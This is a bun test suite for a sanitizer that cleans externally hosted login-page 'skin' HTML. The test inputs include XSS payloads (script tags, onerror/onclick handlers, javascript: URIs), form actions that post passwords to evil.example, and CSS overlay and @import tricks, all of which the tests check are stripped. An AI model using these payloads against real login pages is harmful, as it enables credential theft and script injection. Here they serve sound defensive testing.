import { describe, expect, it } from "bun:test";
import { sanitizeSkinHtml } from "../../src/lib/server/skin/sanitize";

/**
 * `sanitizeSkinHtml` — 외부 호스트에서 가져온 커스텀 스킨 HTML 의 정화.
 *
 * 이 파일만 vitest 가 아니라 **bun test** 로 돌린다. 대상 모듈이 Cloudflare Workers 의 전역
 * `HTMLRewriter` 를 쓰는데 vitest 는 node 프로세스에서 돌아 그 전역이 없다(`typeof HTMLRewriter
 * === "undefined"`). 그래서 이 모듈은 그동안 테스트가 아예 불가능했다.
 *
 * Bun 은 같은 API(`new HTMLRewriter().on(sel, handlers).transform(Response)`)를 네이티브로
 * 제공하고 내부 엔진도 workerd 와 같은 lol-html 이다. 프로젝트가 이미 Bun 1.x 를 요구하므로
 * 의존성을 늘리지 않고 실제 구현으로 검증할 수 있다. `bun run test` 가 vitest 뒤에 이 디렉터리를
 * 이어서 실행한다.
 *
 * 주의: workerd 와 Bun 의 HTMLRewriter 는 같은 엔진이지만 같은 빌드는 아니다. 파서 세부 동작까지
 * 프로덕션과 동일함을 보장하려면 `@cloudflare/vitest-pool-workers` 로 workerd 안에서 돌려야 한다.
 */

/** 정화 후 남은 태그 이름을 소문자로 모은다. */
function tagsIn(html: string): string[] {
    return [...html.matchAll(/<([a-z][a-z0-9:-]*)/gi)].map((m) => m[1].toLowerCase());
}

describe("금지 태그는 내용까지 제거한다", () => {
    // 내용을 가질 수 있는 태그 — 자식 텍스트까지 사라져야 한다.
    for (const tag of ["script", "iframe", "object"]) {
        it(`<${tag}> 을 내용까지 제거한다`, async () => {
            const out = await sanitizeSkinHtml(`<div>keep</div><${tag}>PAYLOAD</${tag}>`);
            expect(tagsIn(out)).not.toContain(tag);
            expect(out).not.toContain("PAYLOAD");
            expect(out).toContain("keep");
        });
    }

    // void 요소 — 닫는 태그가 없으므로 뒤따르는 텍스트는 이 요소의 자식이 아니다.
    // 태그 자체와 그 속성이 사라지는지만 본다.
    for (const tag of ["embed", "base", "meta", "link"]) {
        it(`<${tag}> 을 제거한다 (void 요소)`, async () => {
            const out = await sanitizeSkinHtml(`<div>keep</div><${tag} src="https://evil.example/x" href="https://evil.example/x">`);
            expect(tagsIn(out)).not.toContain(tag);
            expect(out).not.toContain("evil.example");
            expect(out).toContain("keep");
        });
    }

    it("<style> 는 남기고 위치 선언만 걷어낸다", async () => {
        const out = await sanitizeSkinHtml(`<style>.card{color:red;position:fixed;top:0}</style><div class="card">x</div>`);
        expect(out).toContain("<style>");
        expect(out).toContain("color:red");
        expect(out).not.toContain("position:fixed");
        expect(out).not.toContain("top:0");
        expect(out).toContain(`<div class="card">x</div>`);
    });

    it("대문자 태그도 제거한다", async () => {
        const out = await sanitizeSkinHtml(`<SCRIPT>alert(1)</SCRIPT><p>ok</p>`);
        expect(out.toLowerCase()).not.toContain("alert(1)");
        expect(out).toContain("<p>ok</p>");
    });

    it("허용 태그와 텍스트·구조는 보존한다", async () => {
        const html = `<form method="POST"><label>ID</label><input type="text" name="username"><button type="submit">로그인</button></form>`;
        const out = await sanitizeSkinHtml(html);
        expect(out).toContain(`<input type="text" name="username">`);
        expect(out).toContain("로그인");
        expect(tagsIn(out)).toEqual(["form", "label", "input", "button"]);
    });
});

describe("이벤트 핸들러 속성을 제거한다", () => {
    for (const attr of ["onclick", "onerror", "onload", "onmouseover", "onfocus"]) {
        it(`${attr} 제거`, async () => {
            const out = await sanitizeSkinHtml(`<div ${attr}="steal()">x</div>`);
            expect(out).not.toContain(attr);
            expect(out).not.toContain("steal()");
        });
    }

    it("대소문자가 섞인 핸들러도 제거한다", async () => {
        const out = await sanitizeSkinHtml(`<img src="/a.png" OnError="steal()">`);
        expect(out.toLowerCase()).not.toContain("onerror");
        expect(out).toContain(`src="/a.png"`);
    });

    it("`on` + 글자로 시작하면 핸들러가 아니어도 함께 제거된다 (의도적으로 넓게 잡음)", async () => {
        // /^on[a-z]/i 는 `one` 같은 이름도 잡는다. 실존하는 HTML 속성 중 이 패턴에 걸리는
        // 비핸들러 속성은 없고, 스킨은 데이터 전달에 data-* 를 쓰므로 넓게 잡아도 손해가 없다.
        const out = await sanitizeSkinHtml(`<div one="1" data-ok="2">x</div>`);
        expect(out).not.toContain(`one="1"`);
        expect(out).toContain(`data-ok="2"`);
    });
});

// 속성 정화는 `el.attributes` 를 순회하며 removeAttribute 를 호출한다. 이터레이터가 라이브라서
// 배열로 확정하지 않으면 제거 직후 **다음 속성이 검사 없이 통과**했다. 희생용 속성을 앞에 두는
// 것만으로 우회가 가능했고, 특히 외부 form action 이 살아남으면 CSP form-action('https:' 허용)
// 아래에서 비밀번호가 공격자 서버로 POST 된다. 이 스위트가 그 우회를 고정한다.
describe("속성 제거가 다음 속성을 건너뛰지 않는다 (이터레이터 우회 회귀)", () => {
    it("금지 속성 뒤의 이벤트 핸들러도 제거한다", async () => {
        const out = await sanitizeSkinHtml(`<div action="/x" onclick="steal()">a</div>`);
        expect(out).toBe("<div>a</div>");
    });

    it("연속된 이벤트 핸들러를 모두 제거한다", async () => {
        const out = await sanitizeSkinHtml(`<div onclick="a()" onmouseover="b()" onfocus="c()">x</div>`);
        expect(out).toBe("<div>x</div>");
    });

    it("위험한 href 뒤의 핸들러도 제거한다", async () => {
        const out = await sanitizeSkinHtml(`<a href="javascript:a()" onclick="b()">x</a>`);
        expect(out).toBe("<a>x</a>");
    });

    it("희생용 속성을 앞세워 외부 form action 을 살릴 수 없다 (자격증명 유출 차단)", async () => {
        const out = await sanitizeSkinHtml(`<form srcdoc="" action="https://evil.example/collect"><input name="password"></form>`);
        expect(out).not.toContain("evil.example");
        expect(out).not.toContain("action=");
        expect(out).toContain(`<input name="password">`);
    });

    it("희생용 속성을 앞세워 formaction 을 살릴 수도 없다", async () => {
        const out = await sanitizeSkinHtml(`<button sandbox="" formaction="https://evil.example/collect">go</button>`);
        expect(out).toBe("<button>go</button>");
    });

    it("금지 속성 뒤의 위험한 style 도 정화한다", async () => {
        const out = await sanitizeSkinHtml(`<div background="/x" style="position:fixed;color:red">x</div>`);
        expect(out).not.toContain("position:fixed");
        expect(out).toContain("color:red");
    });

    it("정상 속성은 몇 개가 섞여 있어도 순서대로 보존한다", async () => {
        const out = await sanitizeSkinHtml(`<input type="password" name="password" autocomplete="current-password" required>`);
        expect(out).toBe(`<input type="password" name="password" autocomplete="current-password" required>`);
    });
});

describe("금지 속성을 제거한다", () => {
    it("form action 을 제거해 IdP 로 POST 되게 한다", async () => {
        const out = await sanitizeSkinHtml(`<form method="POST" action="https://evil.example/collect"><input name="password"></form>`);
        expect(out).not.toContain("evil.example");
        expect(out).not.toContain("action=");
        // action 이 없으면 현재 URL(=IdP) 로 POST 되므로 정상 로그인 흐름은 유지된다.
        expect(out).toContain(`method="POST"`);
        expect(out).toContain(`<input name="password">`);
    });

    it("formaction 도 제거한다 (버튼 단위 우회 차단)", async () => {
        const out = await sanitizeSkinHtml(`<button formaction="https://evil.example/collect">go</button>`);
        expect(out).not.toContain("formaction");
        expect(out).not.toContain("evil.example");
    });

    for (const attr of ["srcdoc", "sandbox", "background"]) {
        it(`${attr} 제거`, async () => {
            const out = await sanitizeSkinHtml(`<div ${attr}="x">y</div>`);
            expect(out).not.toContain(attr);
        });
    }
});

describe("URI 속성의 scheme 을 제한한다", () => {
    const blocked = [
        [`<a href="javascript:alert(1)">x</a>`, "href"],
        [`<a href="JaVaScRiPt:alert(1)">x</a>`, "href"],
        [`<a href="vbscript:msgbox(1)">x</a>`, "href"],
        [`<img src="file:///etc/passwd">`, "src"],
        [`<video poster="javascript:alert(1)"></video>`, "poster"],
        [`<object data="javascript:alert(1)"></object>`, "data"],
        [`<a href="data:text/html,<b>x</b>">x</a>`, "href"],
    ] as const;

    for (const [html, attr] of blocked) {
        it(`${html.slice(0, 46)} → ${attr} 제거`, async () => {
            const out = await sanitizeSkinHtml(html);
            expect(out.toLowerCase()).not.toContain("javascript:");
            expect(out.toLowerCase()).not.toContain("vbscript:");
            expect(out).not.toContain("file://");
            expect(out).not.toContain("data:text/html");
        });
    }

    const allowed = [
        "https://cdn.test.example/logo.png",
        "http://cdn.test.example/logo.png",
        "data:image/png;base64,AAAA",
        "data:font/woff2;base64,AAAA",
        "mailto:help@test.example",
        "tel:+8210",
        "/login",
        "#main",
    ];

    for (const uri of allowed) {
        it(`${uri} 는 보존한다`, async () => {
            const out = await sanitizeSkinHtml(`<a href="${uri}">x</a>`);
            expect(out).toContain(`href="${uri}"`);
        });
    }

    it("빈 값은 그대로 둔다", async () => {
        expect(await sanitizeSkinHtml(`<a href="">x</a>`)).toContain(`href=""`);
    });

    // SVG data URI 는 맥락별로 다르게 다룬다. <img>/<source> 의 src 에서는 스크립트가 실행되지
    // 않고, CSP 가 외부 이미지를 막는 상황에서 로고를 넣을 유일한 수단이다. 반면 href 는 문서로
    // 열릴 수 있는 형태라 허용하지 않는다.
    describe("data:image/svg+xml 은 img/source 의 src 에서만 허용한다", () => {
        it("<img src> 는 허용", async () => {
            expect(await sanitizeSkinHtml(`<img src="data:image/svg+xml,%3Csvg%3E">`)).toContain("data:image/svg+xml");
        });

        it("<source src> 는 허용", async () => {
            expect(await sanitizeSkinHtml(`<source src="data:image/svg+xml,%3Csvg%3E">`)).toContain("data:image/svg+xml");
        });

        it("<a href> 는 차단", async () => {
            expect(await sanitizeSkinHtml(`<a href="data:image/svg+xml,%3Csvg%3E">x</a>`)).toBe("<a>x</a>");
        });

        it("<div> 의 src 처럼 이미지 태그가 아니면 차단", async () => {
            expect(await sanitizeSkinHtml(`<div src="data:image/svg+xml,%3Csvg%3E">x</div>`)).toBe("<div>x</div>");
        });

        it("png/jpeg data URI 는 태그와 무관하게 허용", async () => {
            expect(await sanitizeSkinHtml(`<a href="data:image/png;base64,AAAA">x</a>`)).toContain("data:image/png");
        });
    });
});

// ctrls M-7: 침해된 스킨 호스트가 인라인 style 로 진짜 로그인 폼을 덮어 자격증명을 훔치는
// 리드레싱을 막는다. 색·글꼴·여백 같은 정상 스타일은 살려야 스킨이 쓸모 있다.
describe("인라인 style 의 오버레이 속성만 무력화한다", () => {
    const stripped = ["position", "top", "left", "right", "bottom", "inset", "inset-block", "z-index", "transform", "transform-origin", "perspective", "float", "clip", "clip-path"];

    for (const prop of stripped) {
        it(`${prop} 제거`, async () => {
            const out = await sanitizeSkinHtml(`<div style="color:red;${prop}:0">x</div>`);
            expect(out).not.toContain(`${prop}:`);
            expect(out).toContain("color:red"); // 정상 스타일은 남는다
        });
    }

    it("여러 위험 속성이 섞여 있어도 정상 속성만 남긴다", async () => {
        const out = await sanitizeSkinHtml(`<div style="position:absolute; top:0; left:0; z-index:9999; background:#fff; padding:8px">x</div>`);
        expect(out).toContain("background:#fff");
        expect(out).toContain("padding:8px");
        for (const p of ["position", "top", "left", "z-index"]) expect(out).not.toContain(`${p}:`);
    });

    it("위험 속성만 있던 style 속성은 통째로 사라진다", async () => {
        const out = await sanitizeSkinHtml(`<div style="position:fixed;z-index:99">x</div>`);
        expect(out).toBe("<div>x</div>");
    });

    it("정상 style 만 있으면 그대로 둔다", async () => {
        const style = "color:#111827;font-size:14px;margin-top:4px";
        expect(await sanitizeSkinHtml(`<div style="${style}">x</div>`)).toContain(`style="${style}"`);
    });

    it("접두사가 같은 다른 속성은 잘려나가지 않는다", async () => {
        // top-… 같은 속성명은 없지만, border-top-width 처럼 top 을 포함하는 이름은 남아야 한다.
        const out = await sanitizeSkinHtml(`<div style="border-top-width:1px">x</div>`);
        expect(out).toContain("border-top-width:1px");
    });
});

// 1-B: <style> 을 허용하되 인라인 style 과 같은 위치/레이어링 필터를 CSS 텍스트에도 적용한다.
// 스킨이 미디어 쿼리·의사클래스·웹폰트를 쓸 수 있어야 실제로 쓸모 있는 화면을 만들 수 있다.
describe("<style> 블록 정화", () => {
    it("색·폰트·여백 선언은 보존한다", async () => {
        const out = await sanitizeSkinHtml(`<style>.card{color:#111;font-size:14px;padding:8px}</style>`);
        expect(out).toContain("color:#111");
        expect(out).toContain("font-size:14px");
        expect(out).toContain("padding:8px");
    });

    it("미디어 쿼리 안의 선언도 같은 규칙으로 걸러낸다", async () => {
        const out = await sanitizeSkinHtml(`<style>@media (max-width:640px){.card{width:100%;position:absolute}}</style>`);
        expect(out).toContain("@media (max-width:640px)");
        expect(out).toContain("width:100%");
        expect(out).not.toContain("position:absolute");
    });

    it("의사클래스 선택자를 보존한다 (인라인 style 로는 표현할 수 없는 것)", async () => {
        const out = await sanitizeSkinHtml(`<style>a:hover{color:#00f}input:focus{outline:2px solid #2563eb}</style>`);
        expect(out).toContain("a:hover");
        expect(out).toContain("input:focus");
    });

    it("@import 는 제거한다 (외부 CSS 로딩 차단)", async () => {
        const out = await sanitizeSkinHtml(`<style>@import url(https://evil.example/x.css);.a{color:red}</style>`);
        expect(out).not.toContain("@import");
        expect(out).not.toContain("evil.example");
        expect(out).toContain("color:red");
    });

    it("주석으로 속성명을 쪼개는 회피를 막는다", async () => {
        const out = await sanitizeSkinHtml(`<style>.a{position/*x*/:fixed;color:red}</style>`);
        expect(out).not.toContain("fixed");
        expect(out).toContain("color:red");
    });

    it("선택자의 > 나 이스케이프가 HTML 이스케이프로 깨지지 않는다", async () => {
        const out = await sanitizeSkinHtml(String.raw`<style>a > b{color:red}.w-1\/2{width:50%}</style>`);
        expect(out).toContain("a > b");
        expect(out).not.toContain("&gt;");
        expect(out).toContain(String.raw`.w-1\/2`);
    });

    it("여러 <style> 블록을 각각 정화한다", async () => {
        const out = await sanitizeSkinHtml(`<style>.a{position:fixed;color:red}</style><style>.b{z-index:9;margin:4px}</style>`);
        expect(out).not.toContain("position:fixed");
        expect(out).not.toContain("z-index:9");
        expect(out).toContain("color:red");
        expect(out).toContain("margin:4px");
    });

    it("빈 <style> 도 견딘다", async () => {
        expect(await sanitizeSkinHtml(`<style></style><p>x</p>`)).toContain("<p>x</p>");
    });
});

describe("문서 전체 정화", () => {
    it("현실적인 스킨 문서에서 위험 요소만 걷어낸다", async () => {
        const dirty = `<!doctype html><html lang="ko"><head><meta charset="utf-8"><title>로그인</title>
<link rel="stylesheet" href="https://cdn.evil.example/x.css"><style>body{position:fixed}</style></head>
<body style="background:#f9fafb;position:relative">
<form method="POST" action="https://evil.example/collect" onsubmit="steal()">
<input type="text" name="username" style="padding:8px;z-index:5">
<input type="password" name="password">
<button type="submit" style="background:#2563eb">로그인</button>
</form>
<script src="https://cdn.evil.example/x.js"></script>
</body></html>`;

        const out = await sanitizeSkinHtml(dirty);

        // 위험 요소는 모두 사라진다.
        for (const bad of ["evil.example", "steal()", "position:fixed", "position:relative", "z-index:5", "action="]) {
            expect(out).not.toContain(bad);
        }
        for (const tag of ["script", "link", "meta"]) expect(tagsIn(out)).not.toContain(tag);
        // <style> 은 남지만 내용의 위치 선언은 사라진다.
        expect(tagsIn(out)).toContain("style");

        // 로그인에 필요한 것과 정상 스타일은 남는다.
        expect(out).toContain(`name="username"`);
        expect(out).toContain(`name="password"`);
        expect(out).toContain(`method="POST"`);
        expect(out).toContain("padding:8px");
        expect(out).toContain("background:#f9fafb");
        expect(out).toContain("background:#2563eb");
        expect(out).toContain("로그인");
    });

    it("빈 입력과 텍스트만 있는 입력을 견딘다", async () => {
        expect(await sanitizeSkinHtml("")).toBe("");
        expect(await sanitizeSkinHtml("그냥 텍스트")).toBe("그냥 텍스트");
    });

    it("닫히지 않은 태그가 있어도 던지지 않는다", async () => {
        const out = await sanitizeSkinHtml(`<div><p>x<script>alert(1)`);
        expect(out).not.toContain("alert(1)");
    });
});
